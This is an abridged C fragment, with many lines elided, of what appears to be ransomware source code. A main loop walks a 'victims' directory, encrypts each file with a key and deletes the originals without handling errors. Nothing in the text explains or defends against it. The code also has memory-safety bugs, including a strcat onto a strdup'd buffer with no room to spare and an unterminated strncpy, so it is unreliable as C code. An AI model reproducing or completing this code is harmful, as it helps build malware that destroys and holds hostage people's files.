...
void encrypt_file(const char *dir_name, const char *orig_filepath, const uint8_t *key,
                  size_t len_key) {
    char *bname;
    char *new_filepath;
    ...
    char *victim = strdup(dir_name);
    victim = strcat(victim, bname);

    if (is_filename_proper(bname) != 0) {
        return;
    }

    if ((origfile_fd = open(victim, O_RDONLY)) < 0) {
    ...
    remove(victim);  // Don't handle any errors
...
char *dirname(char *path) {
    ...
    char *dir = malloc(sizeof(char) * (index + 1));
    return strncpy(dir, path, index+1);
}
...
int main(int argc, char **argv) {
    ...
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            encrypt_file(victims_dir, dir->d_name, (const uint8_t *)key, KEY_LEN);
        }
